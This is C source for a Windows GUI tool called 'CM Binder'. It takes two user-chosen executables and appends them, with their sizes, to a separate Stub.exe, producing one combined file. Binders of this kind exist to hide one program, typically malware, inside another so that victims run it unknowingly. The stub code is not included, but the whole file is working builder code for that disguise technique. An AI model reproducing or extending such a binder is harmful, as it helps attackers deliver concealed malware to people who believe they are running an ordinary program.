#include <windows.h>
#include <fstream>
#include <stdio.h>

/*
  ###### ##     ##          ##          ###    ########   ######  
##    ## ###   ###          ##         ## ##   ##     ## ##    ## 
##       #### ####          ##        ##   ##  ##     ## ##       
##       ## ### ##          ##       ##     ## ########   ######  
##       ##     ##          ##       ######### ##     ##       ## 
##    ## ##     ##          ##       ##     ## ##     ## ##    ## 
 ######  ##     ##          ######## ##     ## ########   ######  
  
Name:       CM Binder
Verion:     0.1
Team:       CM LABS
*/

char File1[MAX_PATH]={0},File2[MAX_PATH]={0},Save[MAX_PATH]={0},*File3;
HWND hClient;
OPENFILENAME  ofn;


enum{ID_BUTTON1=0,ID_BUTTON2=1,ID_BUTTON3=2,ID_S1=3,ID_S2=4,ID_ARCHIVO1=5,ID_ARCHIVO2=6};


LRESULT CALLBACK WindowProcedure (HWND, UINT, WPARAM, LPARAM);


char szClassName[ ] = "Windows";

int WINAPI WinMain (HINSTANCE hThisInstance,
                    HINSTANCE hPrevInstance,
                    LPSTR lpszArgument,
                    int nFunsterStil)

{
    HWND hwnd;               
    MSG messages;            
    WNDCLASSEX wincl;        


    wincl.hInstance = hThisInstance;
    wincl.lpszClassName = szClassName;
    wincl.lpfnWndProc = WindowProcedure;      
    wincl.style = CS_DBLCLKS;                 
    wincl.cbSize = sizeof (WNDCLASSEX);


    wincl.hIcon = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hIconSm = LoadIcon (NULL, IDI_APPLICATION);
    wincl.hCursor = LoadCursor (NULL, IDC_ARROW);
    wincl.lpszMenuName = NULL;                 
    wincl.cbClsExtra = 0;                      
    wincl.cbWndExtra = 0;                      
    
    wincl.hbrBackground = (HBRUSH) COLOR_BACKGROUND+2;

    
    if (!RegisterClassEx (&wincl))
        return 0;

    
    hwnd = CreateWindowEx (
           0,                   
           szClassName,         
           "CM Binder 0.1",     
           WS_OVERLAPPEDWINDOW, 
           CW_USEDEFAULT,       
           CW_USEDEFAULT,       
           460,                 
           230,                 
           HWND_DESKTOP,        
           NULL,                
           hThisInstance,       
           NULL                 
           );
           
           
    memset(&ofn,0,sizeof(ofn));
    ofn.lStructSize     = sizeof(ofn);
    ofn.hwndOwner       = NULL;
    ofn.hInstance       = hThisInstance;
    ofn.lpstrFilter     = "Executables\0*.exe\0\0";
    ofn.nMaxFile        = MAX_PATH;
    ofn.Flags           = OFN_NONETWORKBUTTON | OFN_FILEMUSTEXIST | OFN_HIDEREADONLY;

    ShowWindow (hwnd, nFunsterStil);

    
    while (GetMessage (&messages, NULL, 0, 0))
    {
        TranslateMessage(&messages);
        DispatchMessage(&messages);
    }

    return messages.wParam;
}



char *GetPath()
{
    char *Temp;
    Temp=(char*)malloc(MAX_PATH);
    int c=0,i=0,j;
    GetModuleFileName(0,Temp,MAX_PATH);
    
    while(Temp[c]!='\0')
    {
        if(Temp[c]=='\\'){i=c;}
        c++;
    }
    
    j=c+1;
    c=i+1;
    while(c<j)
    {
        Temp[c]=0;
        c++;
    }
    strcat(Temp,"Stub.exe");
    return Temp;
}

int JuntarArchivo()
{
    char *Buffer;
    int c,i;
    int Size=0,Size1=0,Size2=0;
    File3=GetPath();
    
    FILE *pFile1,*pFile2,*pFile,*pFile3;
      

    
    if(!(pFile3=fopen(File3,"rb"))){MessageBox(0,"Error: Stub.exe NO Encontrado","[X] CM Binder",0); return 1;}
    pFile = fopen (Save,"wb");
    pFile1 = fopen (File1,"rb");
    pFile2 = fopen (File2,"rb");
    
    //Agregando el Stub   
    while( (c=getc(pFile3))!=EOF)
    {
        fwrite(&c,1,1,pFile);    
    }
    
    //Agregando 10 bytes
    c=0;
    for(int i=0;i<10;i++){fwrite(&c,1,1,pFile);}
    
   //Obteniendo el Tamaño del Primer Archivo
   fseek(pFile1,0L,SEEK_END);
   c=ftell(pFile1);
   fwrite(&c,1,sizeof(c),pFile);
   fseek(pFile1,0L,SEEK_SET);
   
   
   //Obteniendo el Tamaño del Segundo Archivo
   fseek(pFile2,0L,SEEK_END);
   c=ftell(pFile2);
   fwrite(&c,1,sizeof(c),pFile);
   fseek(pFile2,0L,SEEK_SET);
   
    
    //Agregando el Primer Archivo
    while( (c=getc(pFile1))!=EOF)
    {
        fwrite(&c,1,1,pFile);
    }
      
    //Agregando el Segundo Archivo
    while( (c=getc(pFile2))!=EOF)
    {
        fwrite(&c,1,1,pFile);
    }
    
    fclose(pFile);    
    fclose(pFile1);
    fclose(pFile2);
    fclose(pFile3);
    MessageBox(0,"Archivo Bindeado Correctamente, Disfruta de tu CM","CM Binder",0);
}

LRESULT CALLBACK WindowProcedure (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)                  
    {
        case WM_CREATE:
            CreateWindowEx(0,"STATIC", "Archivo 1: ", WS_VISIBLE | WS_CHILD, 10, 40, 70, 20,hwnd, (HMENU)(ID_S1), NULL, NULL);
            CreateWindow("EDIT","",WS_OVERLAPPED | ES_AUTOHSCROLL | WS_CHILD | WS_VISIBLE | WS_CLIPSIBLINGS | WS_TABSTOP | WS_EX_NOPARENTNOTIFY | WS_EX_CLIENTEDGE | WS_EX_LEFT | WS_EX_LTRREADING | WS_EX_RIGHTSCROLLBAR,10,65,400,20,hwnd,(HMENU)(ID_ARCHIVO1),NULL,NULL);
            CreateWindowEx(0,"BUTTON", "...",WS_CHILD | WS_VISIBLE | WS_TABSTOP, 420, 65, 20, 20,hwnd, (HMENU)ID_BUTTON1, NULL, NULL);
            
            CreateWindowEx(0,"STATIC", "Archivo 2: ", WS_VISIBLE | WS_CHILD, 10, 100, 70, 20,hwnd, (HMENU)(ID_S2), NULL, NULL);
            CreateWindow("EDIT","",WS_OVERLAPPED | ES_AUTOHSCROLL | WS_CHILD | WS_VISIBLE | WS_CLIPSIBLINGS | WS_TABSTOP | WS_EX_NOPARENTNOTIFY | WS_EX_CLIENTEDGE | WS_EX_LEFT | WS_EX_LTRREADING | WS_EX_RIGHTSCROLLBAR,10,125,400,20,hwnd,(HMENU)(ID_ARCHIVO2),NULL,NULL);
            CreateWindowEx(0,"BUTTON", "...",WS_CHILD | WS_VISIBLE | WS_TABSTOP, 420, 125, 20, 20,hwnd, (HMENU)ID_BUTTON2, NULL, NULL);
            
            CreateWindowEx(0,"BUTTON", "Juntar!",WS_CHILD | WS_VISIBLE | WS_TABSTOP, 180, 160, 70, 25,hwnd, (HMENU)ID_BUTTON3, NULL, NULL);
            hClient=hwnd;
            break;
            
        case WM_COMMAND:
            switch (LOWORD(wParam))
            {
                case ID_BUTTON1:
                    ofn.lpstrTitle      = "Seleccione El Primer Archivo";
                    ofn.lpstrFile       = File1;
                    if (!GetOpenFileName(&ofn)) return(0);
                    SetWindowText(GetDlgItem(hClient,ID_ARCHIVO1),File1);
                break;
                
                case ID_BUTTON2:
                    ofn.lpstrTitle      = "Seleccione El Segundo Archivo";
                    ofn.lpstrFile       = File2;
                    if (!GetOpenFileName(&ofn)) return(0);
                    SetWindowText(GetDlgItem(hClient,ID_ARCHIVO2),File2);
                break;
                    
                case ID_BUTTON3:
                    ofn.lpstrFile       = Save;
                    if(File1[0]=='\0' || File2[0]=='\0'){MessageBox(0,"Error: Debe Seleccionar Los Archivos A Bindear","[X] CM Binder",0); break;}
                    if (!GetSaveFileName(&ofn)) return(0);
                    if(Save[0]=='\0'){break;}
                    
                    JuntarArchivo();
                break;    
            }
            break;
            
        case WM_DESTROY:
            PostQuitMessage (0);       
            break;
            
        default:                      
            return DefWindowProc (hwnd, message, wParam, lParam);
    }

    return 0;
}
